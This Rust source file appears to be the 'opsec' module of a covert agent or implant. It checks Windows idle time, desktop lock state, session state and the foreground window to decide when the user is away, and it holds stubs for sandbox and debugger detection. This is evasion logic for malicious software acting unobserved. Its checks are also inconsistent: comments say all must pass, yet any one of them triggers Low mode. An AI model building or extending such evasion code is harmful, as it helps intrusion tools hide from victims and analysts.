use log::{debug, warn};

// Opsec mode per default on High risk to ensure maximum security.
// This module is responsible for detecting the current opsec level based on user activity and system state.
// In short, this ensure the agent to be highly paranoid.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsecLevel {
    High, // High risk, user present/active or unknown
    Low,  // Low risk, user idle/locked and checks passed
}

pub fn detect_opsec_level() -> OpsecLevel {
    #[cfg(target_os = "windows")]
    {
        let idle = is_user_idle_windows();
        if idle {
            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        debug!("[OPSEC] Non-Windows platform: defaulting to High Opsec.");
        OpsecLevel::High
    }
}

#[cfg(target_os = "windows")]
fn is_user_idle_windows() -> bool {
    use std::ptr;
    use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO, GetForegroundWindow};
    use winapi::um::winuser::OpenInputDesktop;
    use winapi::um::wtsapi32::{WTSQuerySessionInformationW, WTS_CURRENT_SESSION, WTSConnectStateClass, WTSActive};
    use winapi::shared::minwindef::{DWORD, FALSE};

    // 1. Check idle time
    unsafe {
        let mut lii = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0,
        };
        if GetLastInputInfo(&mut lii) != 0 {
            let tick_count = winapi::um::sysinfoapi::GetTickCount();
            let idle_time = tick_count - lii.dwTime;
            debug!("[OPSEC] Idle time: {} ms", idle_time);
            // Only consider idle if more than 5 minutes
            if idle_time <= 5 * 60 * 1000 {
                debug!("[OPSEC] User not idle (idle_time <= 5min).");
                return false;
            }
        } else {
            warn!("[OPSEC] GetLastInputInfo failed, assuming High Opsec.");
            return false;
        }
    }

    // 2. Check if desktop is locked
    unsafe {
        let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
        if hdesk.is_null() {
            debug!("[OPSEC] Desktop is locked or inaccessible.");
            return true;
        }
        debug!("[OPSEC] Desktop is unlocked.");
        // Optionally: CloseHandle(hdesk);
    }

    // 3. Check session state
    unsafe {
        let mut state: *mut WTSConnectStateClass = ptr::null_mut();
        let mut bytes_returned: DWORD = 0;
        let result = WTSQuerySessionInformationW(
            ptr::null_mut(),
            WTS_CURRENT_SESSION,
            0, // WTSConnectState
            &mut state as *mut _ as *mut _,
            &mut bytes_returned,
        );
        if result != 0 && !state.is_null() {
            debug!("[OPSEC] Session state: {:?}", *state);
            if *state != WTSActive {
                debug!("[OPSEC] Session is not active.");
                return true;
            }
        } else {
            warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
        }
    }

    // 4. Foreground window (optional, for extra paranoia)
    unsafe {
        let fg_window = GetForegroundWindow();
        if fg_window.is_null() {
            debug!("[OPSEC] No foreground window detected.");
            return true;
        }
        debug!("[OPSEC] Foreground window present.");
    }

    // If all checks indicate idle/locked, return true (Low Opsec)
    debug!("[OPSEC] All checks indicate user is present or active.");
    false
}

#[cfg(not(target_os = "windows"))]
fn is_user_idle_windows() -> bool {
    debug!("[OPSEC] is_user_idle_windows() called on non-Windows platform.");
    false
}

pub fn is_sandboxed() -> bool {
    // TODO: Implement sandbox detection
    false
}

pub fn is_debugged() -> bool {
    // TODO: Implement debugger detection
    false
}